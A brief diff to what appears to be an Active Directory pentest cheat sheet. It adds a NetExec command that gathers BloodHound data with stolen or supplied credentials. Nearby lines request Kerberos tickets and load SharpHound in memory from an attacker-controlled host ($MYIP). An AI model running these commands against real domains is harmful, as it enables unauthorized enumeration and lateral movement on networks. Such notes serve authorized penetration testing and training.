@@ -12,6 +12,7 @@ nmap -n -Pn $TARGET --script "ldap* and not brute" -p 389 | grep 'dnsHostName:' 
 impacket-getTGT -dc-ip $TARGET '$DOM/$USERNAME:$PASSWORD'; kcme
 
 ## Bloodhound Data
+nxc ldap $TARGET --dns-tcp --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound -c all
 bloodhound-ce-python -u '$USERNAME' -k -no-pass -d $DOM -ns $TARGET -op $DC_$TARGET --zip -c All; unzip $DC*_bloodhound.zip -d /Upload/bloodhound
 \windows\tasks\Reflect.exe http://$MYIP/windows/Sharphound.exe -c all --ldapusername '$USERNAME' --ldappassword '$PASSWORD'
 
